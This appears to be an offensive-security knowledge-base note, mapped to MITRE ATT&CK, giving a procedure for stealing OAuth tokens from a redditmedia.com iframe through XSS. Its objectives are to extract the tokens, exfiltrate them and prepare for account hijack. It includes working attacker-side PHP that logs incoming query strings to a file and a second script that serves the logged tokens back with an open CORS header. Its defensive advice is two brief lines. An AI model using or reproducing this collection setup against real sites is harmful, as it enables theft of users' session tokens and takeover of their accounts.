---
tags:
  - token-theft
  - xss
type: procedure
tools:
  - '[[tools/Google-Tag-Manager]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/php-log-querystring]]'
  - '[[commands/php-parse-log]]'
platforms:
  - Web
techniques:
  - '[[Steal Web Session Cookie]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 4bd2138f-6bf4-4535-b8e6-8c6dd0798036
created_at: '2025-12-14T00:11:25.330Z'
updated_at: '2025-12-14T00:11:25.330Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
---
# Steal OAuth Tokens via XSS

## Summary

This procedure uses XSS in the redditmedia.com iframe to extract leaked tokens from window.name and exfiltrate them via postMessage to the attacker's server.

## Description

The injected JS monitors the iframe's window.name for the URL fragment containing tokens and logs them using PHP endpoints.

## Requirements

1. Malicious page with XSS active
2. Server hosting log.php and parse.php
3. Victim has completed sign-in

## Defense

Defensive measures and detection strategies:

- Sanitize window.name usage
- Restrict postMessage origins

## Objectives

1. Extract tokens from fragment
2. Exfiltrate to attacker server
3. Prepare for hijack

## Instructions

### Step 1: Monitor and Extract Tokens

**Context**: Injected JS in iframe captures window.name.

Extract fragment and send via postMessage.

### Step 2: Log Tokens on Server

**Context**: Use PHP to log and parse stolen data.

Execute [[commands/php-log-querystring]] for logging:

```php
<?php if(isset($_SERVER['QUERY_STRING'])){ file_put_contents('r.log',$_SERVER['QUERY_STRING']."\n",FILE_APPEND); } ?>
```

Then [[commands/php-parse-log]] to retrieve:

```php
<?php header("Access-Control-Allow-Origin: *"); header("Content-type: text/plain"); $key= @$_GET['q']; if(!$key||!preg_match('#^[a-f0-9]{48}$#',$key)){die;} $data=explode("\n",file_get_contents('r.log')); foreach($data as $line){ if(strpos($line,$key)!==false){ echo $line."\n"; die; } } ?>
```

> Tokens are now available on server.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Steal Web Session Cookie]]

### Sub-Techniques



## Commands Used

- [[commands/php-log-querystring]]
- [[commands/php-parse-log]]

## Tools Used

- [[tools/Google-Tag-Manager]]

## Tags

- token-theft
- xss
